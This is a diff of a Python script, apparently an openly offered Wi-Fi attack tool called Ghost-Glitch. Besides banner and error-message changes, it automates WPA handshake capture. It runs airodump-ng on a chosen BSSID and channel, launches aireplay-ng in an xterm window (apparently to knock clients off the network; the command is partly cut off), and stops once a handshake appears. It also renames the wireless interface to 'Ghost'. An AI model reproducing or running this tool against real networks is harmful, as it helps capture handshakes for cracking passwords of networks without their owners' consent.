@@ -29,18 +29,52 @@ B = '\033[34m'          # blue
 P = '\033[35m'          # purple
 C = '\033[36m'          # cyan
 
+
+# Getting Version of File
+try:
+    pathOFScript = os.path.abspath(os.path.dirname(__file__))
+    pathOFScript = pathOFScript[:-5]
+    versionFile = pathOFScript + ".version"
+    with open(versionFile, "r") as file:
+        versionOfScript = file.read()
+except: 
+    versionOfScript = "--"
+    pass
+
+
 def bann_text():
-    clear()
+    # clear()
     logo = """ 
-    ░██████╗░██╗░░██╗░█████╗░░██████╗████████╗░░░░░░░██████╗░██╗░░░░░██╗████████╗░█████╗░██╗░░██╗
-    ██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝░░░░░░██╔════╝░██║░░░░░██║╚══██╔══╝██╔══██╗██║░░██║
-    ██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗██║░░██╗░██║░░░░░██║░░░██║░░░██║░░╚═╝███████║
-    ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░╚════╝██║░░╚██╗██║░░░░░██║░░░██║░░░██║░░██╗██╔══██║
-    ╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░░░░░░░╚██████╔╝███████╗██║░░░██║░░░╚█████╔╝██║░░██║
-    ░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░╚═════╝░╚══════╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
-    
+░██████╗░██╗░░██╗░█████╗░░██████╗████████╗░░░░░░░██████╗░██╗░░░░░██╗████████╗░█████╗░██╗░░██╗
+██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝░░░░░░██╔════╝░██║░░░░░██║╚══██╔══╝██╔══██╗██║░░██║
+██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗██║░░██╗░██║░░░░░██║░░░██║░░░██║░░╚═╝███████║
+██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░╚════╝██║░░╚██╗██║░░░░░██║░░░██║░░░██║░░██╗██╔══██║
+╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░░░░░░░╚██████╔╝███████╗██║░░░██║░░░╚█████╔╝██║░░██║
+░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░╚═════╝░╚══════╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
     """
-    print(logo)
+    print(R + logo + G)
+    print(R+ f"\t\t\t\t\t\t\t\t- by iBrokenShadow ({versionOfScript})\n\n\n" + G)
+    
+def ReportError():
+    header = "\n\n\n\n\t-------------------------------------------------------------"
+    header2 = "\t-------------------------------------------------------------"
+    MainHeader = "\tREPORT ANY ERROR FOR FIXES (Thanks for your Contribution)"
+    mainMessage = """
+        Given Contacts : Telegram  : https://t.me/iBrokenShadow
+                       : Instagram : https://www.instagram.com/iBrokenShadow/
+                       : Github    : https://github.com/iBrokenShadow
+    """
+    Terrr2 = "\tThanks! visit https://ibrokenshadow.com"
+    
+    print(C + header + W)
+    
+    print(R + MainHeader + W)
+    print(W + mainMessage + W)
+    print(G + Terrr2 + W)
+    
+    print(C + header2 + W)
+
+
     
 def run(cmd):
     subprocess.run(cmd)
@@ -79,7 +113,6 @@ except:
     try: input("Press Any Key to quit...")
     except KeyboardInterrupt: sys.exit(0)
     sys.exit(0)
-    
 
 def exit_pause():
     print("\n") ; input("Press Any Key to quit...") ; clear() #; exit()
@@ -118,6 +151,14 @@ def SlowType(text):
     print()  # Print a newline after printing the sentence slowly
 
   
+  
+# Fastly Type something instead of sudden print   
+def FastType(text):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(0.005)
+    print()  # Print a newline after printing the sentence slowly
 
 
 # Check if Monitor Mode is already Enabled
@@ -201,32 +242,6 @@ def get_connected_clients_from_csv(csv_file):
     return connected_clients
 
 
-#######################################################################################################
-def PostMain():
-    try:
-        subprocess.run("clear")
-        print(output_lines)
-        lines = (CountCSVLines(CAPfileName+"-01.csv")) + 6 ; i = 0
-        
-        # CHECK IF HANDSHAKE ACTUALLY CAPTURED OR NOT
-        if retVAL == True:
-            while i<lines: 
-                print("\n") ; i+=1
-            print(" HANDSHAKE CAPTURED")
-            print(f"\n Captured Files are stored in : \n \"{path}\"\n\n Press Enter to Close...\n\n")
-            
-        if retVAL == False:
-            print("\n\n ERROR! HANDSHAKE NOT CAPTURED...\n Try Again...\n\n")
-            print(f" Captured Files are stored in : \n \"{path}\"")
-            
-        input()
-    except KeyboardInterrupt:
-        print("\n\nBYE")
-    except Exception as e: 
-        subprocess.run("clear")
-        print(f"ERROR: {e}") ; input()
-
-#######################################################################################################
 
 def CountCSVLines(CapturedCSV_File):
     try:
@@ -246,21 +261,93 @@ def moveFilestoPath(files):
             shutil.move(file, path)
             
     except KeyboardInterrupt: 
+        sys.exit(0)
+        
+        
+        
+# Change Interface Name to Ghost        
+def change_interface_name(current_name, new_name):
+    def get_next_interface_name(base_name):
+        i = 1
+        while True:
+            if current_name.endswith("mon"):
+                interface_name = f"{base_name}{i}mon"
+            else: interface_name = f"{base_name}{i}"
+            
+            if not check_interface_exists(interface_name):
+                return interface_name
+            i += 1
+
+    def check_interface_exists(interface_name):
+        try:
+            subprocess.check_output(['ip', 'link', 'show', interface_name])
+            return True
+        except subprocess.CalledProcessError:
+            return False
+
+    def rename_interface(current_name, new_name):
+        try:
+            subprocess.run(['ip', 'link', 'set', current_name, 'down'])
+            subprocess.run(['ip', 'link', 'set', current_name, 'name', new_name])
+            subprocess.run(['ip', 'link', 'set', new_name, 'up'])
+        except Exception as e:
+            print(f"\n\n\n\nERROR 128: {e}")
+            time.sleep(0.2) ; ReportError() ; sys.exit(1)
+
+    try:
+        next_name = get_next_interface_name(new_name)
+        rename_interface(current_name, next_name)
+        return next_name
+    except Exception as e:
+        print(f"\n\n\n\nERROR 169: {e}")
+        time.sleep(0.2) ; ReportError() ; sys.exit(1)
+        
+        
+
+#----------------------------------------------------------------------
+                            # POST DEMON
+#----------------------------------------------------------------------
+def PostDemon():
+    try:
         subprocess.run("clear")
-        print("\n\nBYE") ; sys.exit(0)
+        print(output_lines)
+        lines = (CountCSVLines(CAPfileName+"-01.csv")) + 6 ; i = 0
+        
+        # CHECK IF HANDSHAKE ACTUALLY CAPTURED OR NOT
+        if retVAL == True:
+            while i<lines: 
+                print("\n") ; i+=1
+            print(" HANDSHAKE CAPTURED")
+            print(f"\n Captured Files are stored in : \n \"{path}\"\n\n Press Enter to Close...\n\n")
+            
+        if retVAL == False:
+            print("\n\n ERROR! HANDSHAKE NOT CAPTURED...\n Try Again...\n\n")
+            print(f" Captured Files are stored in : \n \"{path}\"")
+        
+        
+    except KeyboardInterrupt:
+        print("\n\n") ; time.sleep(0.2) ; ReportError() ; sys.exit(1)
+    except Exception as e: 
+        print(f"ERROR: {e}")
+        time.sleep(0.2) ; ReportError() ; sys.exit(1)
+
+########################################## --END--  ###################################################
+
+
+
+
+
 
 
 #######################################################################################################
-#                                                                                                     #
+#                                           MAIN FUNCTION                                             #
 #######################################################################################################
-# MAIN FUNCTION
-# Get path exact name where the script is stored
 
 try:
     RES = 0 ; requirements()
     # PythonFilepath = os.path.abspath(os.path.dirname(__file__)) + "/"
     current_directory = os.getcwd() + "/"
-    MonitorModeDisbaled_RedirectProgramA(PythonFilepath + "A_monitorMode.py")
+    MonitorModeDisbaled_RedirectProgramA(PythonFilepath + "ghost-glitch.py")
 
     CSVfilePath = PythonFilepath + "airodumped_BS_list-01.csv"
     path = PythonFilepath + "CaptureHandshake_BS" + "/"
@@ -277,20 +364,33 @@ try:
         for fileh in filesH: os.remove(fileh)
     except: pass
     
-    try:
-        result = subprocess.run(['sudo', 'rm', '-r', path]) 
-        result = subprocess.run(['sudo', 'mkdir', path])
+    try: os.remove(path)
+    except: pass
+    try: os.makedirs(path)
     except: pass
     subprocess.run("clear")
     
     # CAPTURE COMMAND STARTS    
     global retVAL ; retVAL = False
+    
+                
+                
+#----------------------------------------------------------------------
+#                               DEMON
+#----------------------------------------------------------------------
+    Old_INTERFACE_NAME = INTERFACE
+    AbraKaDabra = change_interface_name(INTERFACE, "Ghost")   # Name Changed with suffix Ghost
+    INTERFACE = AbraKaDabra ; clear()
+    
 
-    # Command 1: Run airodump-ng in the current terminal
-    proc1 = subprocess.Popen(["airodump-ng", "--bssid", BSSID, "--channel", CHANNEL, INTERFACE, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'], stdout=subprocess.PIPE, text=True)
-    RES = 1
-    # print(["airodump-ng", "--bssid", BSSID, "--channel", CHANNEL, INTERFACE, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'])
-    # input()
+
+    # # Command 1: Run airodump-ng in the current terminal
+    # print(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one']) ; input()
+    proc1 = subprocess.Popen(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'], stdout=subprocess.PIPE, text=True) ##### , '--write-interval', '1', '--ignore-negative-one'
+    RES = 1                     
+                                                                                                                    
+    
+    time.sleep(1)
     # Command 2: Run aireplay-ng in a new xterm window
     aireplay_command = [
         "xterm",
@@ -308,25 +408,32 @@ try:
         
         print(line)  # Print the output of command 1
         if "handshake" in line.lower():  # Check if the word "handshake" is in the line
-            proc2.terminate()
-            proc1.terminate()
+            proc2.kill() ; proc1.kill()
             retVAL = True
             break
     
-        
+
+    proc2.kill() ; proc1.kill()
     subprocess.run("clear")
     if RES==1: 
         moveFilestoPath(files)
-        PostMain()
+        PostDemon() ; time.sleep(0.2) ; ReportError() ; sys.exit(1)
     sys.exit(0)
-    
+
+#--------------------END-----------------------
+
+
+
 except KeyboardInterrupt:
-    subprocess.run("clear")
+    #subprocess.run("clear")
     if RES==1: 
         moveFilestoPath(files)
-        PostMain()
-    sys.exit(0)
+        PostDemon()
+        
+    proc2.kill() ; proc1.kill()
+    time.sleep(0.2) ; ReportError() ; sys.exit()
     
 except Exception as e:
+    proc2.kill() ; proc1.kill()
     subprocess.run("clear")
     print(f"ERROR: {e}") ; input()
